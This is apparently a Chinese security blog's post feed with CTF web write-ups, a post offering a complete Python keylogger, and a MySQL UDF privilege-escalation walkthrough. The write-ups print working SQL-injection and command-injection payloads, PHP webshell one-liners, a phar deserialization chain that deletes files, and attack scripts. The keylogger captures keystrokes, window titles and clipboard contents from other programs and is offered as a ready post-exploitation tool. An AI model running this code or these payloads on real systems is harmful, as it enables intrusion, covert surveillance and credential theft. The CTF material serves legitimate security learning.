[SWPU2019]Web1打开是个登入页面:一波测试后发现没什么东西,注册个用户在里面测试发现二次注入,先申请广告然后去广告详情看见mysql报错经过测试过滤了空格,or,and,updatexml等等函数,猜测一下有用字段,构造payload1&#39;union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22发现2和3是可以爆出数据的,因为过滤了or所以用不了information_schema数据库,所以要绕过,博主没有绕过去是考猜的猜测为users表。看了别人wp发现其实阔以绕利用mysql数据库的innodb_table_stats表构造payload1&#39;union/**/select/**/1,(select/**/group_concat(table_name)from/**/mysql.innodb_table_stats/**/where/**/database_name=database()),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22然后就是无列名获取数据了payload&#39;/**/union/**/select/**/1,group_concat((select/**/group_concat(c)/**/from/**/(select/**/1,2,3/**/c/**/union/**/select/**/*/**/from/**/users)b)),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22 参考链接https://mariadb.com/kb/en/mysqlinnodb_table_stats/ [安洵杯 2019]easy_web题目页面:看到题目的img参数猜测是加密过的,加密方法1.16进制加密2.base64加密2次解码他加密的文件名是555.png,然后图片内容是经过base64加密的,这里猜测他可能存在文件包含,我们去包含index.php测试一下payloadTmprMlpUWTBOalUzT0RKbE56QTJPRGN3得到源码 12345678910111213141516171819202122232425262728293031323334353637383940414243&lt;?phperror_reporting(E_ALL || ~ E_NOTICE);header('content-type:text/html;charset=utf-8');$cmd = $_GET['cmd'];if (!isset($_GET['img']) || !isset($_GET['cmd'])) header('Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=');$file = hex2bin(base64_decode(base64_decode($_GET['img'])));$file = preg_replace("/[^a-zA-Z0-9.]+/", "", $file);if (preg_match("/flag/i", $file)) &#123; echo '&lt;img src ="./ctf3.jpeg"&gt;'; die("xixi～ no flag");&#125; else &#123; $txt = base64_encode(file_get_contents($file)); echo "&lt;img src='data:image/gif;base64," . $txt . "'&gt;&lt;/img&gt;"; echo "&lt;br&gt;";&#125;echo $cmd;echo "&lt;br&gt;";if (preg_match("/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\'|\"|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i", $cmd)) &#123; echo("forbid ~"); echo "&lt;br&gt;";&#125; else &#123; if ((string)$_POST['a'] !== (string)$_POST['b'] &amp;&amp; md5($_POST['a']) === md5($_POST['b'])) &#123; echo `$cmd`; &#125; else &#123; echo ("md5 is funny ~"); &#125;&#125;?&gt;&lt;html&gt;&lt;style&gt; body&#123; background:url(./bj.png) no-repeat center center; background-size:cover; background-attachment:fixed; background-color:#CCCCCC;&#125;&lt;/style&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt; 代码审计过后,我们要满足一下条件就可以达到命令执行1.$_GET[&#39;cmd&#39;]不可以出现正则表达式里面的内容2.并且$_POST[&#39;a&#39;]和$_POST[&#39;b&#39;]的2个数不可以相同,但是md5值要一样(不存在弱类型比较)解决条件2的方法是md5碰撞利用fastcoll_v1.0.0.5.exe工具生成一样的md5值然后用url编码加密文件内容把那串url编码分别传个a和b就可以执行命令了a=%06%11%40%27%91q%F9%DC%25%0F%1AX%D3%B2%8B%0C%B9%BC%FA%A3%D7%D9%BBH%16%F2x%29%D05%A8x%F7%AD%0D%C8hh%89%CD%EB%FFrC%C55%BC%91%8F%D7%23%AE%B1q%8DU%20-%F4v%B0%03%AD%07z%EF%9FL%BF%0A%E6%12G%21%95%D6G%B6%AD%CA%A9%95%23%97t%5B%82%FF%AD%C5%10O%B7_%88%B7%D7u%26%F4%97%86%0F%FE%F4C%CC%3B%3C%10%EBW%00%D7W%13%01%B0%A6%AD%D3%B7%F4%9E%F7sYo&amp;b=%06%11%40%27%91q%F9%DC%25%0F%1AX%D3%B2%8B%0C%B9%BC%FA%23%D7%D9%BBH%16%F2x%29%D05%A8x%F7%AD%0D%C8hh%89%CD%EB%FFrC%C5%B5%BC%91%8F%D7%23%AE%B1q%8DU%20-%F4%F6%B0%03%AD%07z%EF%9FL%BF%0A%E6%12G%21%95%D6G%B6%AD%CA%A9%95%23%17t%5B%82%FF%AD%C5%10O%B7_%88%B7%D7u%26%F4%97%86%0F%FE%F4C%CC%3B%3C%90%EAW%00%D7W%13%01%B0%A6%AD%D3%B7%F4%1E%F7sYo可以看到命令执行成功,用dir命令在根目录发现flag,然后可以用\符号来分割我们的命令,这样就可以绕过正则payloadc\at /flag]]></content>
      <categories>
        <category>学习记录</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[键盘记录]]></title>
    <url>%2F2019%2F12%2F30%2F%E9%94%AE%E7%9B%98%E8%AE%B0%E5%BD%95%2F</url>
    <content type="text"><![CDATA[代码使用方法:运行后直接使用,可以获取其他窗口的键盘记录,按esc键可以退出监听如果有其他刚好的功能可以联系博主,博主会竭尽所能去完成 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051# -*- coding: utf-8 -*- # date:2019-12-30# author:错空import keyboardimport timeimport win32guiimport win32clipboardimport sysclass Clavier: def __init__(self,file): self.name = &apos;&apos; self.file = file def up(self,e): # 监听键盘记录 if(self.name == &apos;ctrl&apos;): if(e.name == &apos;c&apos; or e.name == &apos;x&apos;): self.Ctrl_cx() else: if(e.event_type == &apos;down&apos;): win = win32gui.GetForegroundWindow() #获取当前使用的窗口 self.name = e.name self.file.write(&quot;-&quot;*20 + &quot;Keydown Start&quot; + &apos;-&apos;*20 + &quot;\n&quot;) self.file.write(&quot;Time:&quot; + time.strftime(&quot;%a,%d %b %Y %H:%M:%S&quot;, time.gmtime()) + &quot;\n&quot;) self.file.write(&quot;Title:&quot; + win32gui.GetWindowText(win) + &quot;\n&quot;) #将当前使用窗口标题写入文件中 self.file.write(&quot;Text:&quot; + e.name + &quot;\n&quot;) self.file.write(&quot;-&quot;*20 + &quot;Keydown End&quot; + &apos;-&apos;*20 + &quot;\n&quot;) def Ctrl_cx(self): # 把剪贴板内容写入文件 try: win32clipboard.OpenClipboard() pasted_value = win32clipboard.GetClipboardData() win32clipboard.CloseClipboard() self.file.write(&quot;Copy:&quot; + pasted_value + &quot;\n&quot;) except: passif __name__ == &apos;__main__&apos;: if len(sys.argv) &gt;= 2: file = open(sys.argv[1],&apos;w&apos;) else: file = open(&apos;keyboard.txt&apos;,&apos;w&apos;) key = Clavier(file) keyboard.hook(key.up) keyboard.wait(&apos;esc&apos;) file.close() 用法环境:python3 123pip install keyboardpip install pywin32pip install win32clipboard 命令:key.txt代表把键盘记录输出到的文件 结果:]]></content>
      <categories>
        <category>学习记录</category>
      </categories>
      <tags>
        <tag>tool</tag>
        <tag>后渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2019GXYCTF复盘]]></title>
    <url>%2F2019%2F12%2F29%2F2019GXYCTF%2F</url>
    <content type="text"><![CDATA[Ping Ping Ping打开页面需要我们传入ip参数,从题目名就可以知道这里是命令执行绕过发现当前目录下有index.php和flag.php,然后通过fuzz发现他过滤了空格和flag字符串和其他的一些字符,过滤空格可以用$IFS$9来绕过,因为不知道他具体过滤了哪些内容我们可以先查看index.php来查看代码127.0.0.1;cat$IFS$9index.php发现过滤了非常多,最后想到的payload 1127.0.0.1;w=g;cat$IFS$9fla$w.php 看了别人的wp发现了另外2中 1127.0.0.1;cat$IFS$9`ls` 1127.0.0.1;cat$IFS$9f`echo$IFS$PATH|cut$IFS$9-c6`ag.php BabysqliV3.0一开始被题目误导因为是sql注入,测试了半天也没有发现,看了别人的wp才发现是弱密码进去。账号:admin密码:password登入进去后是一个文件上传的页面,看到url觉得有可能存在文件包含且包含后面有加了个php后缀,也就是必须是php后缀的,我们可以先把源码个包含出来审计源码知道我们上传的文件如果没有给name传入参数就会把我们的文件名进行md5加密然后在加上.txt后缀,然后如果传入了name值那么就会用name来当文件名但是name不可以出现data://,filter://,php://, .最后面那个是空格点,因为最后面那个是空格点不上.所以我们这个正则没有什么卵用,我们可以直接上传php文件 禁止套娃通过目录扫描发现git文件泄露,用Git_Extract把文件下载查看代码后感觉好像有点难,因为他过滤了太多东西了,然后看了看题目发现禁止套娃,那肯定是套娃题啊,把他正则拿去百度了一波发现了和最近上海大学的一题类似先套用他的查看目录的payload,因为payload是存在一定随机性的所以要多试几次var_dump(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(chr(ord(hebrevc(crypt(phpversion())))))))))))));然后这里和上海那题有点不一样,因为他的flag.php在第三行如果要读取的话就要想其他办法,这里我想到了先把他数组进行倒序排序,然后在用next函数就可以定位到flag.php了,然后用file读取在用var_dump输出就可以得到了 1var_dump(file(next(array_reverse(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(chr(ord(hebrevc(crypt(phpversion())))))))))))))))); BabySQli页面:题目可知考sql注入,随手一个单引号发现报错有一串注释的地方是用base32进行加密的,解密后的内容c2VsZWN0ICogZnJvbSB1c2VyIHdoZXJlIHVzZXJuYW1lID0gJyRuYW1lJw==是base64然后在解密的内容是select * from user where username = &#39;$name&#39;然后经过简单的测试发现过滤了or,=和and关键字,or我们可以用||代替,1=1可以用/1来代替发现还要密码正确,然后我们可以利用联合查询来查询我们的密码admin&#39;union select 1,2,3#可以看到一共有3个列名,猜测第一个列名是id,第二个列名是username,第三个是password,然后我们可以构造如下payloadname=admin&#39;union select 1,&#39;admin&#39;,1 limit 1,1#&amp;pw=1因为密码经过md5加密所以把1进行md5加密name=admin&#39;union select 1,&#39;admin&#39;,&#39;c4ca4238a0b923820dcc509a6f75849b&#39; limit 1,1#&amp;pw=1 BabyUpload页面上传php后缀的图片,发现被过滤,只要ph后缀的都不行尝试上传.txt后缀文件,查看他是利用什么黑名单过滤还是白名单过滤访问一下发现访问成功了,但是比赛的时候他是会删掉的,要用条件竞争去绕过,这里不用的话就可以直接上传一个.htaccess的文件,然后上传随意后缀的后门,就可以了先上传jpg后缀的后门发现被拦截替换为&lt;script language=&quot;php&quot;&gt;eval($_GET[0])&lt;/script&gt;成功,然后访问上传.htaccess文件,内容是SetHandler application/x-httpd-php访问shell可以看见过滤了命令执行函数,我们可以用scandir来查看flag在哪里在根目录,然后有show_source]]></content>
      <categories>
        <category>学习记录</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ctf练习(3)]]></title>
    <url>%2F2019%2F12%2F14%2Fctf%E7%BB%83%E4%B9%A0(3)%2F</url>
    <content type="text"><![CDATA[[0CTF 2016]piapiapia题目页面:打开题目没什么思路,登入不存在sql注入,然后也没有看到注册的页面,在爆破目录的时候也爆破不出来东西404的页面也会返回状态码200且是index.php的内容,在尝试备份备份文件的时候发现了www.zip ,下载后查看发现有几个php文件发现有register.php这个注册页面,首先我们先参数注册然后登入看看里面的内容发现了有个文件上传,尝试上传php文件发现上传成功,访问上传成功后返回的profile.php文件发现并没有解析我们的php文件,而是把我们的php文件内容变成base64生成图片,看来没有办法,只可以进行代码审计,来找了。利用Seay工具自动审计发现了一些有可能存在漏洞的地方。然后经过简单的审计发现只有第三条有可能存在,第一第二条都有过滤,然后第四条他的文件名是结果md5加密过的,文件名不可控。我们看看任意文件读取的,在profile.php中这里他先经过反序列化取出内容,然后读取$profile[‘photo’]这个里面的内容在base64编码,这也就是我们上传的文件会被base64编码显示出来的原因了。然后config.php看到了flag的字样所以大概思路就是我们要让$profile[‘photo’]这个变量是config.php。然后看看$profile[‘photo’]他是怎么赋值的,在update.php中有赋值他是upload/这个路径加上我们文件名的md5来赋值的,这就陷入了死胡同。不过仔细发现他有serialize和unserialize有可能还考的是反序列化的东西,然后知道了我们如果可以控制序列化里面的内容就有可能更改其他属性的内容。例如这样是没什么问题可是如果我们可以控制里面的属性,就可以看到,他里面的内容逃逸出来了,因为他属性中只会匹配属性中长度的值,然后遇到};就会停止反序列化。我们可以通过这个方法来更改他$profile[‘photo’]的值变成config.php,因为我们传入的字符串他在进行序列化的时候,他的长度肯定是足够的,不可能出现长度不够的情况,所以我们要找到一个可以更改序列化长度的地方这里他会进行替换字符串,因为除了where其他都是6个字符串,只有where是5个字符,这里为什么要用5个字符的呢,主要因为他替换后的内容是hacker,hacker是6个字符,多出了一个字符,这样我们就可以插入我们的内容。然后这里我们控制nickname来逃逸,首先要把nickname变成数组,因为上传有限制,要用数组绕过然后我们构造初步的序列化 1a:4:&#123;s:5:&quot;phone&quot;;s:6:&quot;123456&quot;;s:5:&quot;email&quot;;s:10:&quot;123@qq.com&quot;;s:8:&quot;nickname&quot;;a:1:&#123;i:0;s:4:&quot;test&quot;;&#125;s:5:&quot;photo&quot;;s:39:&quot;upload/098f6bcd4621d373cade4e832627b4f6&quot;;&#125; 变成 1a:4:&#123;s:5:&quot;phone&quot;;s:6:&quot;123456&quot;;s:5:&quot;email&quot;;s:10:&quot;123@qq.com&quot;;s:8:&quot;nickname&quot;;a:1:&#123;i:0;s:4:&quot;test &quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125; &quot;;&#125;s:5:&quot;photo&quot;;s:39:&quot;upload/098f6bcd4621d373cade4e832627b4f6&quot;;&#125; 其中多个空格中间代表我们传入的字符串,&quot;;}s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;},一共有34个字符串,我们就要照出34个where,最后payload 1wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125; 然后访问profile.php把那串base64进行解码拿到flag 参考链接https://www.jianshu.com/p/3b44e72444c1https://blog.csdn.net/zz_Caleb/article/details/96777110 [ByteCTF 2019]EZCMS打开页面发现敏感文件 www.zipindex.php页面源代码可以发现只要我们输入的密码不是admin我们就可以登入成功upload.php页面源代码我们可以发送任意后缀的文件,说明存在文件上传漏洞,参数先上传一个php文件上传失败,说我们不是admin用户。在查看了一下源代码发现了,他调用了config.php文件中Admin类里面的upload_file函数,upload_file函数代码他判断checker的值是否为假,如果为假就执行die函数,我们看看checker是怎么定义的他是调用Profile类里面的is_admin()函数,查看此函数的代码他会获取我们的sessoin值然后要变量username的值等于admin,变量password不等于admin,然后拿http头的user里面的值与md5($secret.$username.$password)函数的返回值进行对比,如果相等就返回真,但是user和md5($secret.$username.$password)函数对比的时候不存在弱类型比较,然后进行查看其他函数发现了,我们的cookie有个hash,然后查看了hash的定义发现了他是用md5($secret.&quot;adminadmin&quot;)定义的,只要我们传入的username和password的值都是admin就可以了,可是password的值在我们登入的时候不给等于admin,这里就想到了哈希长度扩展攻击,原理下面有链接,这里直接操作把得到的字符串里面的\x00替换为%00变成 1admin%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%90%00%00%00%00%00%00%00cuokon 然后把上面那一串当成密码提交,然后hashpump这里也给了md5值,把md5值变成cookie中user的值提交后就可以上传文件了,切记文件上传的时候要有user那个值,否则上传不成功发现已经上传成功了,没有提示其他内容,在访问upload.php就可以得到路径,点击里面的超链接,得到路径后访问发现返回500突然想去他原来就有一个.htaccess文件,他也是一个php的配置文件,我们要把他给删掉,才可以访问我们的php页面发现了他有可能存在phar反序列化,因为在view.php中他调用了config.php文件中的File类,里面的view_detail方法,他用了mime_content_type函数,他有可能导致phar反序列化漏洞然后现在办法就是上传一个phar文件,里面构造了一个可以删除文件的pop链,(因为本人比较菜,没有构造出来看了别人的wp菜知道),然后发现了他的_destruct函数他最后调用了upload_file这个函数,我们可以找一下有__call这个函数的并且没有upload_file函数的类,最后定位到了Profile类他会调用open函数,去php.net网站中找到了一个符合条件的类这里我们使用的是ZipArchive类,也就是第一个函数用法:第一个参数是文件名,第二个参数是用什么方法打开,这里别人都是用2中方法打开就可以导致删除文件所以这里开始构造 1234567891011121314151617181920212223242526&lt;?phpclass File&#123; public $filename; public $filepath; public $checker;&#125; class Profile&#123; public $username; public $password; public $admin;&#125; $o = new File();$o-&gt;checker=new Profile();$o-&gt;checker-&gt;admin=new ZipArchive();$o-&gt;checker-&gt;username="./sandbox/33c6f8457bd77fce0b109b4554e1a95c/.htaccess";$o-&gt;checker-&gt;password=ZIPARCHIVE::OVERWRITE;@unlink("phar.phar");$phar = new Phar("phar.phar");$phar-&gt;startBuffering();$phar-&gt;setStub("&lt;?php __HALT_COMPILER(); ?&gt;");$phar-&gt;setMetadata($o);$phar-&gt;addFromString("test.txt", "test");$phar-&gt;stopBuffering();?&gt; 注意要在php.ini中配置pharreadonly为Off然后把生成的phar.phar文件上传上去,上传完成后再上传我们的php一句话,因为他有过滤,我们的一句话木马要变形一下 1234&lt;?php$a='syste';$a.='m';$a($_GET[0]); 上传后我们要先触发phar反序列化,然后在访问我们的一句话木马,在触发完phar反序列化后不要访问upload.php因为你访问后他还会生成.htaccessFile类中过滤了很多协议,不过他没有过滤php这个伪协议,然后可以用php://filter/resource=这样绕过直接访问我们的一句话木马发现没有返回500说明成功触发了phar反序列化,这里报错只是我们没有传入变量导致的,执行cat /flag获取flag 参考链接hash长度扩展攻击https://www.cnblogs.com/pcat/p/5478509.htmlhttps://www.freebuf.com/articles/web/31756.htmlhttps://www.freebuf.com/articles/web/69264.html题目详解https://blog.csdn.net/qq_42181428/article/details/100659865https://www.cnblogs.com/hetianlab/p/11926681.html]]></content>
      <categories>
        <category>学习记录</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ctf练习(2)]]></title>
    <url>%2F2019%2F12%2F12%2Fctf%E7%BB%83%E4%B9%A0(2)%2F</url>
    <content type="text"><![CDATA[[HCTF 2018]WarmUp题目页面:查看源代码发现source.php访问source.php可以直接看到php源码然后进行审计第一个if语句,直接判断我们传入的值是否在$whitelist数组里面。第二个if语句,他会先截取问号前面的字符串,然后判断截取后的字符串是否在$whitelist数组里面第三个if语句,他会先url解码,然后在截取问号前面的字符串,最后判断截取后的字符串是否在$whitelist数组里面第一个判断肯定是绕不过去的,第二个的话我们可以构造一个这样的payloadsource.php?../../../../../etc/passwd这样他在第二个判断的时候他会返回true,然后让他被include包含,可是问题来了,因为他是个?后面的字符串会被当做参数传入,不能达到我们要的效果,所以第二个判断也绕不过。第三个判断他会先进行url解码,比第二个判断多了个步骤,那么加了这个后我们就有办法可以绕过了,我们把?进行url编码2次。payload变成source.php%253f../../../../../etc/passwd他在判断的时候会和第二个一样,因为他有个url解码,把我们的%253f变成?,所以他会返回true,然后include会去包含我们的内容因为他那里还有个hint.php我们访问看看发现他说flag在ffffllllaaaagggg我们去包含就可以获得flag了 [SUCTF 2019]CheckIn题目页面:上传一个普通的图片发现他拦截了&lt;?,图片里面不可以出现&lt;?,然后上传一个GIF89a后面接一句话木马上传成功,并且返回了路径和上传后的所有文件名,尝试上传php文件上传失败,然后fuzz过后,发现有ph开头的后缀就会拦截然后看过别人的wp,发现是上传.user.ini文件,他是一个配置文件php配置中有1个配置,可以让php文件都包含一个任意后缀的文件auto_prepend_file=xxx这个配置相当于require(xxx)然后访问上传目录的index.php命令执行成功 [CISCN2019 华北赛区 Day2 Web1]Hack World题目页面:先判断是什么类型的注入,输入1+1发现被拦截,经过测试过滤了*-+等等,我们可以用^或者/来测试,输入2/1返回了2的内容,输入2/2返回了1的内容什么存在数字类型的注入,输入0的话返回的是一个错误,我们可以根据这个来判断这是一个bool类型的注入,然后根据网页显示的内容,我们知道flag在flag表中的flag列中,脚本 1234567891011121314151617181920import requestsimport strings = string.printabledef req(): flag = &apos;&apos; url=&apos;http://7e9d1a4b-e6f7-4e5b-b4cb-564f5eafda81.node3.buuoj.cn/index.php&apos; for i in range(1,70): for j in s: data = &#123; &apos;id&apos;:&apos;(\&apos;&#123;0&#125;\&apos;=ascii((substr((select\nflag\nfrom\nflag),&#123;1&#125;,1))))&apos;.format(ord(j),i) &#125; res = requests.post(url,data=data) text =res.text if(text.find(&apos;glzjin wants a girlfriend&apos;)!=-1): flag += j print(flag) breakreq() Fakebook页面:在join出发现sql注入,抓包,知道username为注入的参数跑到里面的数据都是反序列化的可是没有类,就没有什么办法构造,而且sql注入也没有写shell成功,然后对目录进行了一波爆破,发现有robots.txt和flag.php有备份文件,下载后查看看到curl就想到了是ssrf,代码不是特别难只对blog进行了过滤,要求我们输入以http://和https:// 开头的字符串,只要把blog的地址替换成读取flag的file://协议, 就可以拿到flag然后点击username那个链接输入一个不存在的值发现爆出了绝对路径,然后可以知道flag的绝对路径是/var/www/html/flag.php,然后测试是否有sql注入发现他报错了,而且报错信息是有未闭合的’,所以猜测这里存在sql注入,这里就有思考一下了,他这个地方是从数据库读取反序列化的内容,结果序列化后读取blog的地址,在去用curl请求,那么我们可以让他读取到我们的构造的序列化的内容,替换掉数据库查询的内容,我们可以随便在sqlmap中去一个序列化的内容例如我取O:8:&quot;UserInfo&quot;:3:{s:4:&quot;name&quot;;s:0:&quot;&quot;;s:3:&quot;age&quot;;i:12;s:4:&quot;blog&quot;;s:16:&quot;cuokon.github.io&quot;;}然后我们修改最后面的blog字符串长度和blog的地址,变成 1O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:0:&quot;&quot;;s:3:&quot;age&quot;;i:12;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125; 然后构造sql语句 1no=0 union/**/select 1,2,3,&apos;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:0:&quot;&quot;;s:3:&quot;age&quot;;i:12;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;&apos;; 这里用/**/的原因是union和select不能在一起,否则会被拦截然后因为他把内容放在图片上进行了base64加密,我们右键查看源代码就可以拿到里面的内容了base64解密]]></content>
      <categories>
        <category>学习记录</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ctf练习(1)]]></title>
    <url>%2F2019%2F12%2F10%2Fctf%E7%BB%83%E4%B9%A0(1)%2F</url>
    <content type="text"><![CDATA[[强网杯 2019]高明的黑客访问页面可以看到网站源码备份在 www.tar.gz 那直接访问页面下载就可以了。下载后发现一堆乱七八糟的文件,而且有上千个然后用代码审计工具发现里面有很多文件有可执行命令的函数和其他一些危险的函数初步猜测里面可能是有一个后门,要我们去发现。可是有3千多个文件,而且参数也非常的多,不可能一个一个的去猜测,肯定是要通过脚本去发现后门页面。这里有一个小问题,怎么去判断页面是否是有漏洞的页面,我们可以用一个echo 一个标记的东西,在用正则表达式去匹配这个标记,如果匹配到了就代表是那个页面了。用echo原因是不管system函数或者eval函数都是可以得到我们标记的东西。脚本写的比较菜,记得修改路径 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849import threadingimport requestsimport reimport osrget = re.compile(r&apos;\$_GET\[[\&apos;&quot;](.*?)[\&apos;&quot;]\]&apos;)rpost = re.compile(r&apos;\$_POST\[[\&apos;&quot;](.*?)[\&apos;&quot;]\]&apos;)flag = re.compile(r&apos;&lt;pre&gt;This is Shell (.*?)&lt;/pre&gt;&apos;)def GetFilename(): os.chdir(&quot;/root/www/src/&quot;) filename = os.listdir(&apos;./&apos;) return filenamedef GetParameter(text): lget = &apos;&apos; lpost = &apos;&apos; get = &quot;&quot; post = dict() lget = rget.findall(text) lpost = rpost.findall(text) for i in lget: get+=i+&apos;=echo &quot;&lt;pre&gt;This is Shell &apos;+i+&apos;&lt;/pre&gt;&quot;&amp;&apos; for i in lpost: post[i]=&apos;echo &quot;&lt;pre&gt;This is Shell&gt; &apos;+i+&apos;/pre&gt;&quot;&amp;&apos; request = [get,post] return requestdef req(filelist): for i in filelist: with open(i) as f: try: get,data = GetParameter(f.read()) url = &quot;http://89594ab0-1881-42a7-bd87-6c01a1a1f9e3.node3.buuoj.cn/&quot;+i+&apos;?&apos;+get response = requests.post(url,data=data,timeout=2).text result = flag.search(response) if(result): print(&apos;-&apos;*40) print(i) print(result.group(1)) return else: print(i+&quot; pass&quot;) except: print(i+&quot; error&quot;) passfilelist=GetFilename()req(filelist) 运行脚本后:得到后就可以查看flag了 [强网杯 2019]随便注打开题目输入一个’看看是否有明显的注入点直接就报错了,那说明这里肯定有注入点,尝试一下union select发现被过滤了很多关键的字符,那mysql还有什么关键字是没有被过滤的呢,这里就想到了show这个关键字,可是show关键字只可以查看数据库,所有表列都查询不到,这个问题到下面的时候在详细解决,先把能利用的全部利用上首先查看当前数据库下的所有表,要用联合注入1&#39;;show tables#发现了有2个表1.19198109311145142.words然后查看一下表的结构,这里可以用desc这个关键字,他用来查看表的属性 11&apos;;desc `1919810931114514`# 可以看到他有1个列flag这个列然后继续查看words表 11&apos;;desc `words`# words有2个列id和data 然后通过简单的发现,他用的是words这个表,因为如果用1919810931114514这个表的话就直接把flag查询出来了。那接下来我们可以吧1919810931114514表的属性修改成和words表一样的属性,然后把words重命名为words1,把1919810931114514重命名为words这样他在查询的时候会直接查询到我们的flag。1.先增加1919810931114514的id列2.在把1919810931114514的flag列名重命名为data3.然后修改words的名字,并且修改1919810931114514的名字第三步骤要一次性搞定下面是对应的语句1.添加id列 11&apos;;alter table `1919810931114514` add id int not null auto_increment primary key# 2.重命名flag列名为data列名 11&apos;;alter table `1919810931114514` change flag data varchar(100)# 3.对2个数据库进行重命名 11&apos;;rename table words to words1;rename table `1919810931114514` to words# 依次执行上面语句,可以没执行一个语句就可以用desc去查看是否把表的属性改变成功。最后输入个1就可以查看flag了另外发现别人的wp还有另外一种方法,非常简单,可以用Mysql预编译去查看flag 1234set @sql=concat(&apos;selec&apos;,&apos;t flag from `1919810931114514`&apos;);prepare presql from @sql;execute presql;deallocate prepare presql; 然后初步的payload 10&apos;;set @sql=concat(&apos;selec&apos;,&apos;t flag from `1919810931114514`&apos;);prepare presql from @sql;execute presql;deallocate prepare presql;# 然后发现被strstr被拦截了因为strstr是对大小写敏感的,所有可以用大小写绕过,最终payload 10&apos;;SEt @sql=concat(&apos;selec&apos;,&apos;t flag from `1919810931114514`&apos;);prEpare presql from @sql;execute presql;deallocate PrEpare presql;# [RoarCTF 2019]Easy Calc打开页面然后提交表单的时候看到calc.php,访问calc.php发现源码简单来说就是过滤了一些符号,然后只要没有出现那些符号就可以执行命令,其实如果是这样的话就很简单了,可惜事与愿违他用了waf之类的防护软件,然后看了别人的wp才知道可以在?后面加个空格然后在接参数,然后就可以绕过waf,主要原理是waf认为我们传入的参数是num,不是waf要拦截的num,然后php接收的时候还是num所以我们就可以通过这样绕过。然后因为他disable_functions过滤了大部分参数,不过我们还有scandir这个函数,我们可以用这个函数去查看flag在哪里,可是因为我们不能输入单引号和双引号,这里我们可以用chr函数把字符的ascii码变成字符,最后在根目录发现flagpayload 1http://node3.buuoj.cn:27455/calc.php?%20num=1;print_r(scandir(chr(46).chr(47).chr(46).chr(46).chr(47).chr(46).chr(46).chr(47).chr(46).chr(46).chr(47))) 然后后show_source来读取f1agg ,payload 1http://node3.buuoj.cn:27455/calc.php?%20num=1;show_source(chr(46).chr(47).chr(46).chr(46).chr(47).chr(46).chr(46).chr(47).chr(46).chr(46).chr(47).chr(102).chr(49).chr(97).chr(103).chr(103));]]></content>
      <categories>
        <category>学习记录</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[udf提权]]></title>
    <url>%2F2019%2F12%2F09%2Fudf%E6%8F%90%E6%9D%83%2F</url>
    <content type="text"><![CDATA[udf提权udf是mysql的自定义函数,扩展函数,我们可以添加一个执行系统命令的系统函数,来获得权限。在winodw下一般mysql服务的权限都是比较高的,我们执行的系统命令都是用mysql服务的权限去执行系统命令的。 利用条件:1.知道数据库的root用户和密码2.对mysql目录有可读可写的权限 试验首先用命令show variables like &quot;%plugin%&quot;查看插件路径因为一般都没有lib目录和plugin目录,所以要我们创建者2个目录,创建完目录后,查看一下mysql的是多少位的mysql -Vsqlmap文件里面有自带的udf提权的dll文件,我们可以用他来进行提权。路径是:sqlmap\data\udf\mysql\windows\里面有32位和64位的自行选择,然后用sqlmap\extra\cloak\clock.py来生成dll文件python clock.py -d -i lib_mysqludf_sys.dll_,路径自己改会在lib_mysqludf_sys.dll_所在的目录生成lib_mysqludf_sys.dll文件然后把lib_mysqludf_sys.dll发到plugin那个目录,用mysql创建自定义函数create function sys_eval returns string soname &#39;lib_mysqludf_sys.dll&#39;;可以看到函数创建成功,然后看看自己的权限已经是管理员的权限了]]></content>
      <categories>
        <category>技术实战</category>
      </categories>
      <tags>
        <tag>提权</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CVE-2019-1388UAC提权复现]]></title>
    <url>%2F2019%2F11%2F28%2FCVE-2019-1388UAC%E6%8F%90%E6%9D%83%E5%A4%8D%E7%8E%B0%2F</url>
